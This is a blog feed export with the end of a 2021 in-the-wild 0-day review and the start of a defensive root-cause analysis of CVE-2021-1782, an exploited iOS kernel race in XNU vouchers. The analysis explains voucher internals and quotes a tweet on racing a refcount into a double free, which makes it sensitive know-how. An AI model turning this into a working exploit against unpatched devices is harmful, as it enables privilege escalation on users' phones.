 <p class="HNYIspzEBn-c5"><span>Until the day that attackers decide to happily share all their exploits with us, we can&rsquo;t fully know what percentage of 0-days are </span><span>publicly known about</span><span class="HNYIspzEBn-c0">. However when we pull together our expertise as security researchers and anecdotes from others in the industry, it paints a picture of some of the data we&rsquo;re very likely missing. From that, these are some of the key questions we&rsquo;re asking ourselves as we move into 2022:</span></p><h2 class="HNYIspzEBn-c7" id="h.9mkiyelw2l4a"><span class="HNYIspzEBn-c12">Where are the [x] 0-days?</span></h2>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">Despite the number of 0-days found in 2021, there are key targets missing from the 0-days discovered. For example, we know that messaging applications like WhatsApp, Signal, Telegram, etc. are targets of interest to attackers and yet there&rsquo;s only 1 messaging app, in this case iMessage, 0-day found this past year. Since we began tracking in mid-2014 the total is two: a WhatsApp 0-day in 2019 and this iMessage 0-day found in 2021.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>Along with messaging apps, there are other platforms/targets we&rsquo;d expect to see 0-days targeting, yet there are no or very few public examples. For example, since mid-2014 there&rsquo;s only one in-the-wild 0-day each for macOS and </span><span>Linux</span><span class="HNYIspzEBn-c0">. There are no known in-the-wild 0-days targeting cloud, CPU vulnerabilities, or other phone components such as the WiFi chip or the baseband.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>This leads to the question of whether these 0-days are absent due to lack of detection, lack of disclosure, or both?</span></p><h2 class="HNYIspzEBn-c7" id="h.lmeqy4ji80fr"><span class="HNYIspzEBn-c12">Do some vendors have no known in-the-wild 0-days because they&rsquo;ve never been found or because they don&rsquo;t publicly disclose?</span></h2>
 <p class="HNYIspzEBn-c5"><span>Unless a vendor has told us that they will publicly disclose exploitation status for all vulnerabilities in their platforms, we, the public, don&rsquo;t know if the absence of an annotation means that there is no known exploitation of a vulnerability or if there is, but the vendor is just not sharing that information publicly. </span><span>Thankfully this question is something that has a pretty clear solution: all device and software vendors agreeing to publicly disclose when there is evidence to suggest that a vulnerability in their product is being exploited in-the-wild.</span></p><h2 class="HNYIspzEBn-c7" id="h.dckkx2d1dyz5"><span class="HNYIspzEBn-c12">Are we seeing the same bug patterns because that&rsquo;s what we know how to detect?</span></h2>
 <p class="HNYIspzEBn-c5"><span>As we described earlier in this report, all the 0-days we saw in 2021 had similarities to previously seen vulnerabilities. This leads us to wonder whether or not that&rsquo;s actually representative of what attackers are using. Are attackers actually having success exclusively using vulnerabilities in bug classes and components that are previously public? Or are we detecting all these 0-days with known bug patterns because that&rsquo;s what we know how to detect? Public security research would suggest that yes, attackers are still able to have success with using vulnerabilities in known components and bug classes the majority of the time. But we&rsquo;d still expect to see a few novel and unexpected vulnerabilities in the grouping. We posed this question back in the 2019 year-in-review and it still lingers. </span></p><h2 class="HNYIspzEBn-c7" id="h.w9alsmed3bqy"><span class="HNYIspzEBn-c12">Where are the spl0itz?</span></h2>
 <p class="HNYIspzEBn-c5"><span class="HNYIspzEBn-c0">To successfully exploit a vulnerability there are two key pieces that make up that exploit: the vulnerability being exploited, and the exploitation method (how that vulnerability is turned into something useful). </span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>Unfortunately, this report could only really analyze one of these components: the vulnerability. Out of the 58 0-days, only 5 have an exploit sample publicly available. Discovered in-the-wild 0-days are the failure case for attackers and a key opportunity for defenders to learn what attackers are doing and make it harder, more time-intensive, more costly, to do it again. Yet without the exploit sample or a detailed technical write-up based upon the sample, we can only focus on fixing the vulnerability rather than also mitigating the exploitation method. This means that attackers are able to continue to use their existing exploit methods rather than having to go back to the design and development phase to build a new exploitation method. While acknowledging that sharing exploit samples can be challenging (we have that challenge too!), we hope in 2022 there will be more </span><span>sharing of exploit samples or detailed technical write-ups so that we can come together to use every possible piece of information to make it harder for the attackers to exploit more users.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>As an aside, if you have an exploit sample that you&rsquo;re willing to share with us, please reach out. Whether it&rsquo;s sharing with us and having us write a detailed technical description and analysis or having us share it publicly, we&rsquo;d be happy to work with you.</span></p><h1 class="HNYIspzEBn-c11" id="h.e19lp542ae55"><span>Conclusion</span></h1>
 <p class="HNYIspzEBn-c5"><span>Looking back on 2021, what comes to mind is </span><span>&ldquo;baby steps</span><span class="HNYIspzEBn-c0">&rdquo;. We can see clear industry improvement in the detection and disclosure of 0-day exploits. But the better detection and disclosure has highlighted other opportunities for progress. As an industry we&rsquo;re not making 0-day hard. Attackers are having success using vulnerabilities similar to what we&rsquo;ve seen previously and in components that have previously been discussed as attack surfaces.The goal is to force attackers to start from scratch each time we detect one of their exploits: they&rsquo;re forced to discover a whole new vulnerability, they have to invest the time in learning and analyzing a new attack surface, they must develop a brand new exploitation method. &nbsp;And while we made distinct progress in detection and disclosure it has shown us areas where that can continue to improve.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>While this all may seem daunting, the promising part is that we&rsquo;ve done it before: we have made clear progress on previously daunting goals. In 2019, we discussed the large detection deficit for 0-day exploits and 2 years later more than double were detected and disclose</span><span>d</span><span class="HNYIspzEBn-c0">. So while there is still plenty more work to do, it&rsquo;s a tractable problem. There are concrete steps that the tech and security industries can take to make it even more progress:<br></span></p><ol class="c6 lst-kix_czzguda5pqu4-0 start" start="1"><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">Make it an industry standard behavior for all vendors to publicly disclose when there is evidence to suggest that a vulnerability in their product is being exploited,</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">Vendors and security researchers sharing exploit samples or detailed descriptions of the exploit techniques.</span></li><li style="margin-left: 46pt;" class="c4 li-bullet-0"><span class="HNYIspzEBn-c0">Continued concerted efforts on reducing memory corruption vulnerabilities or rendering them unexploitable.</span></li></ol>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>Through 2021 we continually saw the real world impacts of the use of 0-day exploits against users and entities. Amnesty International, the Citizen Lab, and others highlighted </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://citizenlab.ca/2021/10/breaking-news-new-york-times-journalist-ben-hubbard-pegasus/">over</a></span><span>&nbsp;and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://www.amnesty.org/en/documents/doc10/4491/2021/en/">over</a></span><span>&nbsp;how governments were using commercial surveillance products against </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://forbiddenstories.org/pegasus-the-new-global-weapon-for-silencing-journalists/">journalists</a></span><span>,</span><span>&nbsp;</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://www.amnesty.org/en/latest/research/2021/11/devices-of-palestinian-human-rights-defenders-hacked-with-nso-groups-pegasus-spyware-2/">human rights defenders</a></span><span>, and </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://www.reuters.com/technology/exclusive-us-state-department-phones-hacked-with-israeli-company-spyware-sources-2021-12-03/">government officials</a></span><span>. We saw many enterprises scrambling to remediate and protect themselves from the</span><span>&nbsp;</span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/">Exchange Server 0-days</a></span><span>. And we even learned of peer </span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/update-campaign-targeting-security-researchers/">security researchers being targeted by </a></span><span class="HNYIspzEBn-c1"><a class="HNYIspzEBn-c31" href="https://blog.google/threat-analysis-group/update-campaign-targeting-security-researchers/">North Korean government hackers</a></span><span class="HNYIspzEBn-c0">. While the majority of people on the planet do not need to worry about their own personal risk of being targeted with 0-days, 0-day exploitation still affects us all. These 0-days tend to have an outsized impact on society so we need to continue doing whatever we can to make it harder for attackers to be successful in these attacks.</span></p>
 <p class="HNYIspzEBn-c2"><span class="HNYIspzEBn-c0"></span></p>
 <p class="HNYIspzEBn-c5"><span>2021 showed us we&rsquo;re on the right track and making progress, but there&rsquo;s plenty more to be done to make </span><span>0-day</span><span class="HNYIspzEBn-c0">&nbsp;hard.</span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/3023870154175197326/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/3023870154175197326
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/3023870154175197326
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html
## @title
The More You Know, The More You Know You Dont Know
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjC72HVhQEdwHNIzMiyb18bUFr6hPCWJiKL2Mm43-tW11qc0ucOPI8A9oChEXQe0-QNOBF83SIcfyjcyvPveuWvgipbiBzHWqZTx2-LilJFYIbx6uQeno9f481HJQ0CgylQkh8Ks7AbGC6tjhYDNBcI7jh6ihhzJATA0r_P4bQUBm-1lmHp2DPvWM6I/s72-c/image1%287%29.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-5933797027217125856
## published
14/04/2022 12:58:00
## updated
24/08/2022 16:02:07
## title
## @type
text
## #text
CVE-2021-1782, an iOS in-the-wild vulnerability in vouchers
## content
## @type
html
## #text
<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol{margin:0;padding:0}table td,table th{padding:0}.BGLtzooHlW-c13{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.BGLtzooHlW-c3{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,"Courier New";font-style:normal}.BGLtzooHlW-c10{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.BGLtzooHlW-c20{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.BGLtzooHlW-c26{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.BGLtzooHlW-c9{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;font-weight:700;text-decoration:underline}.BGLtzooHlW-c18{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.BGLtzooHlW-c19{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.BGLtzooHlW-c16{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.BGLtzooHlW-c2{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.BGLtzooHlW-c7{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.BGLtzooHlW-c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.BGLtzooHlW-c4{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.BGLtzooHlW-c15{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.BGLtzooHlW-c21{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.BGLtzooHlW-c24{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:center}.BGLtzooHlW-c6{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.BGLtzooHlW-c12{border-spacing:0;border-collapse:collapse;margin-right:auto}.BGLtzooHlW-c27{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.BGLtzooHlW-c25{color:inherit;text-decoration:inherit}.BGLtzooHlW-c11{font-weight:400;font-family:"Courier New"}.BGLtzooHlW-c5{orphans:2;widows:2}.BGLtzooHlW-c1{height:0pt}.BGLtzooHlW-c14{font-style:italic}.BGLtzooHlW-c28{vertical-align:super}.BGLtzooHlW-c8{height:11pt}.BGLtzooHlW-c17{font-weight:700}.BGLtzooHlW-c22{margin-left:36pt}.BGLtzooHlW-c23{background-color:#00ff00}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="BGLtzooHlW-c27">
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Posted by Ian Beer, Google Project Zero</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c17">This blog post is my analysis of a vulnerability exploited in the wild and patched in early 2021. Like the </span><span class="BGLtzooHlW-c9"><a class="BGLtzooHlW-c251" href="https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html">writeup published last week</a></span><span class="BGLtzooHlW-c17">&nbsp;looking at an ASN.1 parser bug, this blog post is based on the notes I took as I was analyzing the patch and trying to understand the XNU vouchers subsystem. I hope that this writeup serves as the missing documentation for how some of the internals of the voucher subsystem works and its quirks which lead to this vulnerability.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>CVE-2021-1782 was fixed in iOS 14.4, as noted by </span><span class="BGLtzooHlW-c21"><a class="BGLtzooHlW-c251" href="https://twitter.com/s1guza/status/1354575808547999744">@s1guza on twitter</a></span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c5 BGLtzooHlW-c24"></p>
  
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTx_FjnSHTtPtnk2F1K8-AYcTnVrIBNV8PNJQgZCOhfoIvU6hD7teqA3Jmb8T8KtIpnIYKuUqa28P-pt-yM2zUsWppkcmdx18pAP8r0XTQH4JHAhpNZkC2uALpz_Pn5_OXK3mXlblNG1i6TIEtLsksgez8GlLTi2zuxP0haGXzaU1XGEj2RQeNjOto/s1182/image1%20%283%29%281%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTx_FjnSHTtPtnk2F1K8-AYcTnVrIBNV8PNJQgZCOhfoIvU6hD7teqA3Jmb8T8KtIpnIYKuUqa28P-pt-yM2zUsWppkcmdx18pAP8r0XTQH4JHAhpNZkC2uALpz_Pn5_OXK3mXlblNG1i6TIEtLsksgez8GlLTi2zuxP0haGXzaU1XGEj2RQeNjOto/s1182/image1%20%283%29%281%29.png" border="0" alt="&quot;So iOS 14.4 added locks around this code bit (user_data_get_value() in ipc_voucher.c). &quot;e_made&quot; seems to function as a refcount, and you should be able to race this with itself and cause some refs to get lost, eventually giving you a double free&quot;" style="max-height: 750; max-width: 600px;" title="&quot;So iOS 14.4 added locks around this code bit (user_data_get_value() in ipc_voucher.c). &quot;e_made&quot; seems to function as a refcount, and you should be able to race this with itself and cause some refs to get lost, eventually giving you a double free&quot;" /></a></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">This vulnerability was fixed on January 26th 2021, and Apple updated the iOS 14.4 release notes on May 28th 2021 to indicate that the issue may have been actively exploited:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"></p>
  
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgz_bD89bznHVJLkW_Kbwy-1JEoHaUyMfeaqDbpVjRTQ366r8ywGgSGps2aPyFa05wBuKWqAi2hJmm76dnbcgoV4YCFug4UWu3OhkHPgKjg6coamg35AId8VsOw5gkIHldyvefgRSX0klbhJ275wnwri6dzSTb_OZwwz2LeUeVjmHIAPsyirypsYonn/s1660/image2%20%282%29%281%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgz_bD89bznHVJLkW_Kbwy-1JEoHaUyMfeaqDbpVjRTQ366r8ywGgSGps2aPyFa05wBuKWqAi2hJmm76dnbcgoV4YCFug4UWu3OhkHPgKjg6coamg35AId8VsOw5gkIHldyvefgRSX0klbhJ275wnwri6dzSTb_OZwwz2LeUeVjmHIAPsyirypsYonn/s1200/image2%20%282%29%281%29.png" border="0" alt="Kernel. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: A Malicious application may be able to elevate privileges. Apple is aware of a report that this issue may have been actively exploited. Description: A race condition was addressed with improved locking. CVE-2021-1772: an anonymous researcher. Entry updated May 28, 2021" style="max-height: 750; max-width: 600px;" title="Kernel. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: A Malicious application may be able to elevate privileges. Apple is aware of a report that this issue may have been actively exploited. Description: A race condition was addressed with improved locking. CVE-2021-1772: an anonymous researcher. Entry updated May 28, 2021" /></a></span></p><h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.iaaooqfddqk2"><span class="BGLtzooHlW-c20">Vouchers</span></h2>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">What exactly is a voucher?</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">The kernel code has a concise description:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c22"><span class="BGLtzooHlW-c14 BGLtzooHlW-c26">Vouchers are a reference counted immutable (once-created) set of indexes to particular resource manager attribute values (which themselves are reference counted).</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">That definition is technically correct, though perhaps not all that helpful by itself.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">To actually understand the root cause and exploitability of this vulnerability is going to require covering a lot of the voucher codebase. This part of XNU is pretty obscure, and pretty complicated.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>A voucher is a reference-counted table of keys and values.</span><span>&nbsp;Pointers to all created vouchers are stored in the global </span><span class="BGLtzooHlW-c11">ivht_bucket</span><span class="BGLtzooHlW-c10">&nbsp;hash table.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">For a particular set of keys and values there should only be one voucher object. During the creation of a voucher there is a deduplication stage where the new voucher is compared against all existing vouchers in the hashtable to ensure they remain unique, returning a reference to the existing voucher if a duplicate has been found.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Here&#39;s the structure of a voucher:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.172bf3f0517e74698dccf6803d0a7cba3e4db4b2"></a><a id="t.0"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">struct</span><span class="BGLtzooHlW-c4">&nbsp;ipc_voucher </span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_index_t &nbsp; &nbsp; iv_hash</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* checksum hash */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_index_t &nbsp; &nbsp; iv_sum</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="BGLtzooHlW-c7">/* checksum of values */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; os_refcnt_t &nbsp; &nbsp;iv_refs</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* reference count */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_index_t &nbsp; &nbsp; iv_table_size</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c7">/* size of the voucher table */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_index_t &nbsp; &nbsp; iv_inline_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">IV_ENTRIES_INLINE</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_entry_t &nbsp; &nbsp; iv_table</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp;</span><span class="BGLtzooHlW-c7">/* table of voucher attr entries */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_port_t &nbsp; &nbsp; iv_port</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* port representing the voucher */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; queue_chain_t &nbsp;iv_hash_link</span><span class="BGLtzooHlW-c2">;</span><span class="BGLtzooHlW-c4">&nbsp; &nbsp;</span><span class="BGLtzooHlW-c7">/* link on hash chain */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">};</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c3">&nbsp;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#define</span><span class="BGLtzooHlW-c4">&nbsp;IV_ENTRIES_INLINE MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">The voucher codebase is written in a very generic, extensible way, even though its actual use and supported feature set is quite minimal.</span></p><h2 class="BGLtzooHlW-c18 BGLtzooHlW-c5" id="h.ws3slh7jndn7"><span class="BGLtzooHlW-c20">Keys</span></h2>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Keys in vouchers are not arbitrary. Keys are </span><span class="BGLtzooHlW-c17">indexes</span><span>&nbsp;into a voucher&#39;s </span><span class="BGLtzooHlW-c11">iv_table</span><span>; a value&#39;s position in the </span><span class="BGLtzooHlW-c11">iv_table</span><span class="BGLtzooHlW-c10">&nbsp;table determines what &quot;key&quot; it was stored under. Whilst the vouchers codebase supports the runtime addition of new key types this feature isn&#39;t used and there are just a small number of fixed, well-known keys:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.bb8dc8863bbdd47aa96ca2a52c637e312485af31"></a><a id="t.1"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#define</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_ALL </span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">mach_voucher_attr_key_t</span><span class="BGLtzooHlW-c2">)~</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#define</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_NONE </span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">mach_voucher_attr_key_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c3">&nbsp;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">/* other well-known-keys will be added here */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#define</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_ATM </span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">mach_voucher_attr_key_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#define</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_IMPORTANCE </span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">mach_voucher_attr_key_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c15">2</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">#define</span><span class="BGLtzooHlW-c4">&nbsp;MACH_VOUCHER_ATTR_KEY_BANK </span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">mach_voucher_attr_key_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c15">3</span><span class="BGLtzooHlW-c2">)</span></p>
